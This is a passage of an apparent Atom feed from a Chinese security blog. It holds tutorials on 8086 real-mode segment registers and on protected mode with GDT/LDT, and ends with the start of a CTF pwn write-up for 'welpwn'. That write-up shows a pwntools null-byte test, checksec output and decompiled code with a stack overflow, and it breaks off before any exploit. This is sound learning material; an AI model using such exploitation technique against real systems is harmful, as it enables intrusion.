class="line">__libc_csu_init</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_fini</span><br></pre></td></tr></table></figure><h3 id="font-color-brown0x04-referencefont"><a class="markdownIt-Anchor" href="#font-color-brown0x04-referencefont"></a> <font color="brown"><code>0x04 Reference</code></font></h3><p>[1] <a href="https://segmentfault.com/a/1190000007406442" target="_blank" rel="noopener">一步一步学ROP之linux_x64篇</a></p><p>[2] <a href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.7_common_gadget.html" target="_blank" rel="noopener">通用 gadget</a></p><p>[3] <a href="https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/" target="_blank" rel="noopener">ROP学习：利用通用gadget</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown0x00-基础知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown0x00-基础知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;&lt;code&gt;0x0
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>实模式下的段寄存器</title>
    <link href="https://muzibing.github.io/2020/06/14/2020.06.14%EF%BC%88126%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/14/2020.06.14（126）/</id>
    <published>2020-06-13T16:00:00.000Z</published>
    <updated>2020-06-15T07:24:44.381Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown0x00-前言font"><a class="markdownIt-Anchor" href="#font-color-brown0x00-前言font"></a> <font color="brown"><code>0x00 前言</code></font></h3><p>      首先想要说明的是这里介绍的原理都是CPU实模式下的情况，有关CPU工作模式的请<a href="https://zhuanlan.zhihu.com/p/42309472" target="_blank" rel="noopener">点击这里</a>，下面简单的介绍一下段寄存器的来源和故事：</p><blockquote><p>     实模式出现于早期8088CPU时期。当时由于CPU的性能有限，一共只有20位地址线（所以地址空间只有1MB），以及8个16位的通用寄存器，以及4个16位的段寄存器。所以为了能够通过这些16位的寄存器去构成20位的主存地址，必须采取一种特殊的方式。当某个指令想要访问某个内存地址时，它通常需要用下面的这种格式来表示：<code>段基址：段偏移量</code>。<sup>[1]</sup></p><p>     但是随着CPU的发展，CPU的地址线的个数也从原来的20根变为现在的32根，<strong>所以可以访问的内存空间也从1MB变为现在4GB，寄存器的位数也变为32位。所以实模式下的内存地址计算方式就已经不再适合了</strong>。所以就引入了现在的保护模式，实现更大空间的，更灵活的内存访问。</p></blockquote><h3 id="font-color-brown0x01-csipfont"><a class="markdownIt-Anchor" href="#font-color-brown0x01-csipfont"></a> <font color="brown"><code>0x01 CS:IP</code></font></h3><p>      在解释段代码段寄存器CS之前，我们先了解一下16位下8086PC的CPU结构，如下图 ：</p><p><img src="/images/126-1.jpg" alt></p><blockquote><p>从图中可以看出，8086CPU是一个16位结构，它在处理、传输、暂存存储的地址为16位，但是它的地址总线为20位，所以要想办法用“地址加法器”使得两个16位的地址合成一个20位的物理地址。图中已经给出解决方法：用一个16位的段地址和一个16位的偏移地址，使得<code>段地址*16+偏移地址</code>就得到了20位的物理地址，相当于<strong>物理地址=基地址（段地址*16）+偏移地址</strong>，那这里为什么乘上16呢，这是因为这里地址的表示方式是16进制，乘上16相当于左移4位，也就从16位变为20位。</p><p><code>在这里留一个问题：怎么将一个20bit的字符串存储在16bit长的内存中呢？</code></p></blockquote><p>      <font color="green"><strong>在程序运行时，CPU怎么知道下一步要执行的语句呢？</strong></font>这里就需要<code>CS:IP</code>上场了，其中CS是代码段寄存器，<strong>存储的是当前指令的段地址</strong>，IP是指令指针寄存器，<strong>存储的是偏移地址</strong>，在8086PC中，CPU将<code>CS:IP</code>指向的内容当作指令执行，比如在8086PC（16位）中，CS的值为a，IP的值为b，那么 CPU下一条执行的指令就是处于地址<code>a*16+b</code>单元的数据，举例如下图：</p><p><img src="/images/126-2.png" alt></p><blockquote><p>图中的CS值为2000H，IP的值0000H，那么物理地址就为<code>2000H*16+0000H = 20000H</code>，所以要执行的指令为<code>mov ax,0123H</code>，下面我们用DOS的Debug进行调试</p></blockquote><p><img src="/images/126-3.png" alt></p><blockquote><p>首先我们将内存2000:0000-2000:0009处的内存改为如上图中的数据，然后我们再将CS和IP的值进行修改</p></blockquote><p><img src="/images/126-4.png" alt></p><blockquote><p>我们可以从上图中最后一行可以看出，CPU将要执行<code>2000:0000</code>处的指令，这样我们就很清楚代码寄存器CS和指令指针寄存器IP的作用了：<font color="red"><code>被用来指向CPU要执行的指令，也可以说将数据解释为代码</code></font></p></blockquote><h3 id="font-colorbrown-0x02-ds和addressfont"><a class="markdownIt-Anchor" href="#font-colorbrown-0x02-ds和addressfont"></a> <font color="brown"><code>0x02 DS和[address]</code></font></h3><p>      <font color="green"><strong>CPU在读写内存单元的时候，那么它是怎么找到该内存单元地址的？</strong></font>下面就来到了数据段寄存器DS，在8086PC中，<code>内存地址</code>由<code>段地址</code>和<code>偏移地址</code>组成，那么DS就是用来存放要访问数据的段地址的寄存器，比如要读取20001H单元的内容，汇编代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2000H</span><br><span class="line">mov ds,ax# 不能直接mov ds,2000H，因为8086CPU不支持将数据直接送入段寄存器的操作</span><br><span class="line">mov al,[1]</span><br></pre></td></tr></table></figure><p>      上面的汇编代码就是将地址20001H处的数据读取到寄存器ax的低8位中，其中<code>[1]</code>表示的是内存单元的偏移地址，<strong><code>ds</code>中的数据为内存单元的段地址</strong>，那么物理地址就为：<code>ds*16+1</code>，这里要说明一点：在<code>mov al,[1]</code>指令中，<code>[]</code>中的<code>1</code>是偏移地址，而CPU会默认去寄存器<code>DS</code>中寻找它的段地址。下面我们还是用<code>0x00</code>中的例子来说明这一点：</p><p><img src="/images/126-3.png" alt></p><blockquote><p>地址<code>2000:0000</code>地址的字节为<code>23b8H</code>（<a href="https://zh.wikipedia.org/zh-hans/%E5%AD%97%E8%8A%82%E5%BA%8F" target="_blank" rel="noopener">小端存储</a>），我们将这个值赋给寄存器<code>ax</code>，则汇编指令为：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2000H</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,[0]</span><br></pre></td></tr></table></figure><blockquote><p>我们在<code>Debug</code>中向地址<code>1000:0000</code>处输入我们的指令，然后再修改<code>CS</code>和<code>IP</code>的值分别为<code>1000</code>和<code>0000</code>，如下图：</p></blockquote><p><img src="/images/126-7.png" alt></p><blockquote><p>从上图中最后一行，我们可以看到下一条指令的指令为<code>mov ax,2000H</code>，那么下面我们执行完上面四条指令看一下结果：</p></blockquote><p><img src="/images/126-8.png" alt></p><blockquote><p>这里简单总结一下：<font color="green"><strong>对于存储在内存中的数据，CPU会根据CS:IP或者DS和[address]来解释为代码或者数值</strong></font></p></blockquote><h3 id="font-color-brown0x03-ssspfont"><a class="markdownIt-Anchor" href="#font-color-brown0x03-ssspfont"></a> <font color="brown"><code>0x03 SS:SP</code></font></h3><p>     <font color="green"><strong>CPU如何知道栈顶的位置？</strong></font>有关栈的问题不在这里叙述了，可以参考这两篇文章：<a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（上）</a>和<a href="https://zhuanlan.zhihu.com/p/25892385" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（下）</a>。我们知道CPU靠的是<code>CS:IP</code>知道了要指令指令所在的位置，靠DS和[address]知道了数据存储的位置，那么CPU也应该有相应的寄存器来存放栈顶的地址，那就是<code>SS:SP</code>，其中段寄存器<code>SS</code>存放的是栈顶的段地址，<code>SP</code>存放的是偏移地址，<strong>任意时刻，SS:SP指向栈顶元素</strong>，push指令和pop指令执行时，CPU会从SS和SP中得到栈顶的位置，但是这里要注意的这两个指令：</p><p><code>push</code></p><blockquote><ul><li><font color="navy">SP = SP - 2，SS:SP指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶</font></li><li><font color="navy">将ax中的值放到SS:SP指向的内存单元，SS:SP此时指向新栈顶</font></li></ul><p>比如初始状态为SS=3000H，SP = 0002H，现在执行<code>push ax</code>，那么栈顶偏移<code>SP = SP - 2</code>，开辟了一个新的16位空间，然后再把ax的值放进去，此时<code>SP=0000H</code>，具体操作如下图</p></blockquote><p><img src="/images/126-9.png" alt></p><blockquote><p>初始值为：</p><ul><li><code>ax=1234H,bx=0000H</code>（普通寄存器）</li><li><code>cs=1000H,IP=000EH</code>（执行指针）</li><li><code>ss=3000H,sp=0002H</code>（栈顶）</li></ul><p>现在向地址<code>1000:000E</code>，处写入下方指令<code>push ax</code>，得到如下结果：</p></blockquote><p><img src="/images/126-10.png" alt></p><blockquote><p>从上图中得出信息：</p><ul><li><code>ax=1234H,bx=0000H</code>（普通寄存器）</li><li><code>cs=1000H,IP=000FH</code>（执行指针）<font size="2" color="navy"><strong>发生改变</strong></font></li><li><code>ss=3000H,sp=0000H</code>（栈顶）<font size="2" color="navy"><strong>发生改变</strong></font></li></ul><p>和我们推到的一样</p></blockquote><p><code>pop</code></p><blockquote><ul><li><font color="navy">将SS:SP指向的内存单元处的数据送入ax中</font></li><li><font color="navy">SP = SP + 2，SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶</font></li></ul><p>比如初始状态为SS=3000H，SP=0000H，现在执行<code>pop bx</code>，那么会将此时栈顶的数据（<code>1234H</code>）放入寄存器<code>bx</code>中，然后<code>SP = SP - 2</code>，具体操作如下：</p></blockquote><p><img src="/images/126-10.png" alt></p><blockquote><p>初始值为：</p><ul><li><code>ax=1234H,bx=0000H</code>（普通寄存器）</li><li><code>cs=1000H,IP=000FH</code>（执行指针）</li><li><code>ss=3000H,sp=0000H</code>（栈顶）</li></ul><p>现在向<code>1000:000F</code>中写入<code>pop bx</code>，如下：</p></blockquote><p><img src="/images/126-11.png" alt></p><blockquote><p>从上图中得出信息：</p><ul><li><code>ax=1234H,bx=1234H</code>（普通寄存器）<font size="2" color="navy"><strong>发生改变</strong></font></li><li><code>cs=1000H,IP=0010H</code>（执行指针）<font size="2" color="navy"><strong>发生改变</strong></font></li><li><code>ss=3000H,sp=0002H</code>（栈顶）<font size="2" color="navy"><strong>发生改变</strong></font></li></ul><p>栈顶又恢复到<code>3000:0002</code>，而且bx的值也发生了改变</p></blockquote><h3 id="font-color-navy0x04-referencefont"><a class="markdownIt-Anchor" href="#font-color-navy0x04-referencefont"></a> <font color="navy"><code>0x04 Reference</code></font></h3><p>[1] <a href="http://blog.csdn.net/michael2012zhao/article/details/5554023" target="_blank" rel="noopener">“段寄存器”的故事</a></p><p>[2] 王爽，《汇编语言》</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown0x00-前言font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown0x00-前言font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;&lt;code&gt;0x00 前言
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="汇编语言" scheme="https://muzibing.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>【转载】CPU 的两种工作模式：实模式和保护模式</title>
    <link href="https://muzibing.github.io/2020/06/14/2020.06.14%EF%BC%88127%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/14/2020.06.14（127）/</id>
    <published>2020-06-13T16:00:00.000Z</published>
    <updated>2020-06-14T12:00:26.348Z</updated>
    
    <content type="html"><![CDATA[<p><font size="2">首先我们要知道这两种模式都是 CPU 的工作模式，实模式是早期 CPU 运行的工作模式，而保护模式则是现代 CPU 运行的工作模式。</font></p><h3 id="font-color-navy0x00-实模式real-modefont"><a class="markdownIt-Anchor" href="#font-color-navy0x00-实模式real-modefont"></a> <font color="navy"><code>0x00 实模式（Real Mode）</code></font></h3><h4 id="font-color-brown1起源font"><a class="markdownIt-Anchor" href="#font-color-brown1起源font"></a> <font color="brown"><code>1.起源</code></font></h4><p><font size="2">实模式出现于早期 8086 CPU 时期，8086 也是第一款支持内存分段模型的处理器。当时，8086 只有一种工作模式，即实模式，但当时还没有这个说法。由于 CPU 的性能有限，一共只有 20 位地址线（地址空间只有 1M），以及 8 个 16 位的通用寄存器，以及 4 个 16 位的段寄存器。16 位的物理地址只能访问 64KB 的内存。所以，为了能够通过这些 16 位的寄存器去构成 20 位的主存地址，访问 1 MB 的内存，必须采取一种特殊的方式。</font></p><h4 id="font-color-brown2原理font"><a class="markdownIt-Anchor" href="#font-color-brown2原理font"></a> <font color="brown"><code>2.原理</code></font></h4><p><font size="2">第一个字段是由段寄存器提供的，是一个 16 位的段基址。第二字段是段内偏移量，它的值是由通用寄存器（如 EIP）来提供，所以也是 16 位。那么问题来了，两个 16 位的值如何组合成一个 20 位的地址呢？这里采用的方式是：把段寄存器所提供的段基址先向左移 4 位（或乘以 16），这样就变成了一个 20 位的值，然后再与 16 位的段偏移量相加。如下所示：</font></p><p><code>物理地址=段基址*16+段内偏移物理地址=段基址*16+段内偏移</code></p><p><font size="2">所以，假设段基址的值是<code>0xFF00</code>，段内偏移的值是<code>0x0110</code>。则物理地址可表示为:</font></p><p><code>0xFF00*16+0x0110 = 0xFF000+0x0110 = 0xFF1100xFF00*16+0x0110 = 0xFF000+0x0110 = 0xFF110</code></p><h4 id="font-color-brown3应用font"><a class="markdownIt-Anchor" href="#font-color-brown3应用font"></a> <font color="brown"><code>3.应用</code></font></h4><p><font size="2"><strong>在现代计算机上，实模式存在的时间非常短</strong>，所以一般我们是感觉不到它的存在。CPU 复位（reset）或加电（power on）的时候就是以实模式启动，在这个时候处理器以实模式工作，不能实现权限分级，也不能访问 20 位以上的地址线，也就只能访问 1M 内存。之后，加载操作系统模块，进入保护模式。</font></p><p><font size="2">此外，在这种模式下，系统在计算实际地址的时候是按照对 1M 求模的方式进行的，这种技术被称为 wrap-around。也就是说，当程序员给出超过 1M（100000H ~ 10FFEFH）的地址时，为了保持逻辑上正常，系统并不认为其访问越界而产生异常，而是自动从 0 开始计算。</font></p><p><font size="2">然而，在实模式中整个物理内存被看成分段的区域，程序代码和数据位于不同区域，<strong>系统程序和用户程序没有区别对待</strong>，而且每一个指针都是指向「实在」的物理地址。这样一来，用户程序的一个指针如果指向了系统程序区域或其他用户程序区域，并改变了值，容易造成软件甚至系统崩溃。</font></p><h3 id="font-color-navy0x01-保护模式protected-modefont"><a class="markdownIt-Anchor" href="#font-color-navy0x01-保护模式protected-modefont"></a> <font color="navy"><code>0x01 保护模式（Protected Mode）</code></font></h3><h4 id="font-color-brown1起源font-2"><a class="markdownIt-Anchor" href="#font-color-brown1起源font-2"></a> <font color="brown"><code>1.起源</code></font></h4><p><font size="2">最开始的程序寻址是直接的<code>段基址 : 段内偏移</code>模式，这样的好处是所见即所得，程序员指定的地址就是物理地址，物理地址对程序员是可见的。但这就带来一些问题：</font></p><blockquote><ol><li>无法支持多任务</li><li>程序的安全性无法得到保证</li></ol></blockquote><p><font size="2">随着 CPU 的发展，CPU 的地址线的个数也从原来的 20 根变为现在的 32 根，所以可以访问的内存空间也从 1 MB 变为现在 4 GB，寄存器的位数也变为 32 位。因此，实模式下的内存地址计算方式就已经不再适用了，需要引入新的模式，即保护模式，实现更大空间的、更灵活的内存访问。</font></p><p><font size="2">在保护模式下，全部 32 条地址线有效，可寻址高达 4 GB 的物理地址空间。扩充的存储器<code>段式管理机制</code>和可选的<code>页式管理机制</code>，不仅为存储器共享和保护提供了硬件支持，而且为实现<code>虚拟存储器</code>提供了硬件支持，支持多任务，能够快速地进行任务切换和保护任务环境。四个特权级和完善的特权检查机制，既能实现资源共享又能保证代码和数据的安全及任务的隔离。</font></p><p><font size="2">总的来说，保护模式出现的原因名副其实</font>：<strong>保护进程地址空间</strong>。</p><h4 id="font-color-brown2原理font-2"><a class="markdownIt-Anchor" href="#font-color-brown2原理font-2"></a> <font color="brown"><code>2.原理</code></font></h4><p><font size="2">在保护模式下，地址的表示方式与实模式是一样的，都是<code>段基址 : 段内偏移</code>。不过，保护模式下<code>段</code>的概念发生了根本性的改变。实模式下的段值可以看作是地址的一部分，可直接参与转换计算。而保护模式下的段值（尽管仍然由原来的段寄存器表示）变成了一个索引（准确来说是 16 位的段选择子/段标识符 Selector，前 13 位为索引信息，后 3 位是硬件信息），指向了一个数据结构的一个表项（段表项），表项中详细定义了<code>段基址</code>、<code>界限</code>、<code>属性（权限）</code>等内容。这个数据结构是<code>全局描述符</code>（GDT，Global Descriptor Table），也有可能是<code>本地描述符</code>（LDT，Local Descriptor Table）。它们存放关于某个运行在内存中的程序的分段信息的，比如某个程序的代码段是从哪里开始，有多大；数据段又是从哪里开始，有多大。</font></p><p><font size="2">GDT 的作用是用来提供段式存储机制，这种机制是段寄存器和 GDT 中的描述符（段表项）共同支持的。每个描述符在 GDT 中占 8 字节，也就是 2 个双字（一个字等于两个字节，双字等于四个字节），或者说是 64 位。描述符的构成如下图所示：</font></p><p><img src="/images/127-1.png" alt></p><center><font size="1">GDT 描述符示意图（来源见参考）</font></center><p><font size="2">其中：</font></p><ul><li><font size="2">G 位是<code>粒度位</code>（Granularity），用于解释段界限的含义；</font></li><li><font size="2">D/B 位是<code>默认的操作数大小</code>（Default Operation Size），主要是为了能够在 32 位处理器上兼容运行 16 位保护模式的程序；</font></li><li><font size="2">L 位，是<code>64 位代码段标志</code>，保留此位给 64 位处理器使用；</font></li><li><font size="2">AVL 位，是<code>可以使用的位</code>（Available），通常由操作系统来用，处理器并不使用它；</font></li><li><font size="2">P 位是<code>段存在位</code>（Segment Present），表示对应的段是否存在；</font></li><li><font size="2">DPL 表示描述符的<code>特权级</code>（Descriptor Privilege Level），<code>0 ~ 3</code>，0 表示最高特权级别，<strong>这里再次点明了为何叫保护模式</strong>；</font></li><li><font size="2">S 位是<code>描述符的类型位</code>（Descriptor Type），0 为系统段，1 为代码段或数据段；</font></li><li><font size="2">TYPE 字段共 4 位，用于指示描述符的类型（X 执行、W 读写、R 读出、A 已访问）。</font></li></ul><p><font size="2">很明显，描述符中指定了 32 位的<code>段基址</code>，以及 20 位的<code>段界限</code>。在实模式下，段基址并非是真实的物理地址，在计算物理地址时，还要左移 4 位（乘以 16）。和实模式不同，在 32 位保护模式下，段基址是 32 位的，若加上段内偏移即为<code>线性地址</code>。如果未开启分页功能，该线性地址就是<code>物理地址</code>。</font></p><p><img src="/images/127-2.png" alt></p><center><font size="1">GDT 和 LDT 示意图（来源见参考）</font></center><p><font size="2">GDT 和 LDT 的区别在于：</font></p><blockquote><ol><li><font size="2">全局可见（global）和局部可见（local）；</font></li><li><font size="2">LDT 表存放在 LDT 类型的段之中，此时 GDT 必须含有 LDT 的段描述符；</font></li><li><font size="2">LDT 本身是一个段，而 GDT 不是。</font></li></ol></blockquote><p><strong>访问流程</strong>：</p><blockquote><ul><li><font size="2">查找 GDT 在线性地址中的段基址（表本身的位置），需要借助 GDTR 寄存器；</font></li><li><font size="2">通过该段基址和<code>逻辑地址</code>中的段标识符（selector），可以找到 LDT 段描述符；</font></li><li><font size="2">通过 GDT 中的这个 LDT 段描述符可以找到 LDT 相应的基地址；</font></li><li><font size="2">访问 LDT 需要使用 LDT 基地址和 LDT 段选择符（或叫段标识符），为了减少访问 LDT 时的段转换次数，LDT 段基址、LDT 段选择符、LDT 段限长都存放在 LDTR 寄存器中。</font></li></ul></blockquote><p><font size="2"><strong>注意</strong>：这里和 <a href="https://junhaow.com/2018/08/15/%E5%85%B3%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">关于操作系统内存管理的总结</a> 中关于段式内存管理的描述有点出入。这里多了 LDT，因此从 GDT 中获得的是 LDT 段描述符，而不再是段基址。</font></p><p><font size="2">对于操作系统来说，每个系统必须定义一个 GDT，用于系统中的所有任务和程序。系统可选择性定义若干个 LDT。GDT 本身不是一个段，而是线性地址空间的一个数据结构；而 LDT 本身是一个段。</font></p><p><font size="2">想知道更多可以参考第三篇文章，整理得很好。</font></p><h3 id="font-color-navy0x02-referencefont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-referencefont"></a> <font color="navy"><code>0x02 Reference</code></font></h3><ul><li><a href="https://www.cnblogs.com/fatsheep9146/p/5116426.html" target="_blank" rel="noopener">MIT 6.828 JOS 学习笔记 6. Appendix 1: 实模式（real mode）与保护模式（protected mode）</a></li><li><a href="https://www.cnblogs.com/chenwb89/p/operating_system_002.html" target="_blank" rel="noopener">操作系统篇-浅谈实模式与保护模式</a></li><li><a href="https://www.cnblogs.com/chenwb89/p/operating_system_003.html" target="_blank" rel="noopener">操作系统篇-分段机制与 GDT | LDT</a></li><li><a href="http://www.voidcn.com/article/p-cdfddfhd-dr.html" target="_blank" rel="noopener">汇编学习（十七）X86汇编学习 (4) GDT</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;font size=&quot;2&quot;&gt;首先我们要知道这两种模式都是 CPU 的工作模式，实模式是早期 CPU 运行的工作模式，而保护模式则是现代 CPU 运行的工作模式。&lt;/font&gt;&lt;/p&gt;
&lt;h3 id=&quot;font-color-navy0x00-实模式real-modefont
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>【XCTF-pwn】welpwn是个什么东西？（RCTF-2015）</title>
    <link href="https://muzibing.github.io/2020/06/12/2020.06.12%EF%BC%88125%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/12/2020.06.12（125）/</id>
    <published>2020-06-12T11:36:40.507Z</published>
    <updated>2020-06-12T16:05:28.704Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-相关知识点"><a href="#0x00-相关知识点" class="headerlink" title="0x00 相关知识点"></a><font color="navy"><code>0x00 相关知识点</code></font></h3><h4 id="1-x00截断符"><a href="#1-x00截断符" class="headerlink" title="1.\x00截断符"></a><font color="blue"><code>1.\x00截断符</code></font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面给大家一个简单的C程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Function：截断符测试</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们现在正常运行一下该程序，输入为“Hello\x00World”，运行结果输出为<code>Hello\x00World</code>，有的人可能要有疑问了，这里的输入有<code>\x00</code>，为什么还会输出<code>World</code>？要注意我们这里输入的<code>\x00</code>被当作4个单独的字符<code>\</code>、<code>x</code>、<code>0</code>和<code>0</code>，没有被内存解释为截断符号，所以这里不会发生字符串截断，那么下面我们通过<code>pwntools</code>工具来演示一下符号截断，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">"./test"</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">payload = <span class="string">"1"</span> + str(p64(<span class="number">0</span>),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"2"</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">print(sh.recv())</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下图是该程序运行的具体过程：</p><p><img src="/images/125-1.png" alt></p><blockquote><ul><li>红色圈中的是p64(0)的数值，会产生<code>\x00</code>截断符</li><li>白色圈中是最后的运行结果，可以发现<code>2</code>没有被打印出来，这是由于前面有截断符号</li></ul></blockquote><p><code>注意</code>：这里应该注意的是对p64()、p32()函数很大概率会产生截断符号</p><h3 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a><font color="navy"><code>0x01 题目分析</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file pwn </span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=a48a707a640bf53d6533992e6d8cd9f6da87f258, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>该程序是一个64位的ELF可执行程序</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn </span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/welpwn/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>只开启了栈不可执行保护，下面对IDA中的伪代码进行分析：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main函数</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-400h]@1</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Welcome to RCTF\n"</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  echo((__int64)&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>main函数功能是输入一个大小为0x400的buf空间，可以看出该输入点不存在栈溢出漏洞；然后里面调用了echo()函数，下面我们进如echo()函数看一下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">echo</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s2[<span class="number">16</span>]; <span class="comment">// [sp+10h] [bp-10h]@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">    s2[i] = *(_BYTE *)(i + a1);</span><br><span class="line">  s2[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">"ROIS"</span>, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"RCTF&#123;Welcome&#125;"</span>, s2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">" is not flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span 